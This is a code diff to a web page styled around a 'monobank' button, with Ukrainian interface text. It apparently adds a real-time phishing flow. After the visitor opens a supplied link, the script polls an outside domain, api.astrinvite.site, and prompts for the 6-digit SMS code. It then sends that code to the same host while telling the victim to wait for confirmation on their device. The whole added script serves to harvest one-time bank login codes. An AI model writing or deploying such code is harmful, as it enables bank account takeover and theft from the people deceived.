@@ -24,6 +24,7 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      text-decoration: none;
     }
     #monobank-btn:disabled {
       background-color: #aaa;
@@ -32,6 +33,35 @@
     #status {
       margin-top: 15px;
       color: #555;
+      font-size: 18px;
+      text-align: center;
+    }
+    #sms-code {
+      font-size: 22px;
+      letter-spacing: 10px;
+      padding: 8px 20px;
+      text-align: center;
+      width: 190px;
+      margin-top: 12px;
+      margin-bottom: 8px;
+    }
+    #send-code-btn {
+      margin-left: 10px;
+      padding: 10px 30px;
+      font-size: 18px;
+      background: #1976d2;
+      color: #fff;
+      border: none;
+      border-radius: 7px;
+      cursor: pointer;
+    }
+    #send-code-btn:disabled {
+      background-color: #aaa;
+      cursor: not-allowed;
+    }
+    #sms-error {
+      color: red;
+      margin-top: 5px;
     }
   </style>
 </head>
@@ -43,9 +73,13 @@
   <script>
     const apiUrl = "https://api.astrinvite.site/link";
     const consumeUrl = "https://api.astrinvite.site/consume-link";
+    const statusUrl = "https://api.astrinvite.site/api/link-status";
+    const codeUrl = "https://api.astrinvite.site/api/submit-code";
     const btn = document.getElementById("monobank-btn");
     const status = document.getElementById("status");
     let currentId = null;
+    let pollingStatus = false;
+    let statusPoller = null;
 
     async function getLink() {
       try {
@@ -68,6 +102,7 @@
           btn.onclick = () => {
             fetch(`${consumeUrl}?id=${currentId}`, { method: "POST" });
             window.open(data.url, "_blank");
+            pollStatus();
           };
         } else {
           throw new Error("Немає посилання");
@@ -79,6 +114,58 @@
         console.error(e);
         setTimeout(getLink, 3000);
       }
+    }
+
+    async function pollStatus() {
+      if (pollingStatus) return;
+      pollingStatus = true;
+      btn.style.display = "none";
+      status.textContent = "Очікуємо підтвердження входу...";
+      statusPoller = setInterval(async () => {
+        try {
+          const res = await fetch(`${statusUrl}?id=${currentId}`);
+          const data = await res.json();
+          if (data.status === "waiting_code") {
+            clearInterval(statusPoller);
+            showCodeInput();
+          }
+        } catch {}
+      }, 2500);
+    }
+
+    function showCodeInput() {
+      status.innerHTML = `
+        <b>Введіть 6-значний код з SMS:</b><br>
+        <input id="sms-code" type="text" maxlength="6" style="" autocomplete="one-time-code" inputmode="numeric">
+        <button id="send-code-btn">Підтвердити</button>
+        <div id="sms-error"></div>
+      `;
+      document.getElementById("sms-code").focus();
+      document.getElementById("send-code-btn").onclick = async () => {
+        let code = document.getElementById("sms-code").value.trim();
+        if (!/^\d{6}$/.test(code)) {
+          document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код!";
+          return;
+        }
+        document.getElementById("send-code-btn").disabled = true;
+        document.getElementById("sms-error").textContent = "";
+        let fd = new FormData();
+        fd.append("id", currentId);
+        fd.append("code", code);
+        try {
+          const res = await fetch(codeUrl, { method: "POST", body: fd });
+          const resp = await res.json();
+          if (resp.ok) {
+            status.innerHTML = "<b>Код прийнято. Чекаємо підтвердження на пристрої…</b>";
+          } else {
+            document.getElementById("send-code-btn").disabled = false;
+            document.getElementById("sms-error").textContent = "Помилка: " + (resp.error || "спробуйте ще");
+          }
+        } catch {
+          document.getElementById("send-code-btn").disabled = false;
+          document.getElementById("sms-error").textContent = "Помилка серверу. Спробуйте ще раз.";
+        }
+      };
     }
 
     getLink();
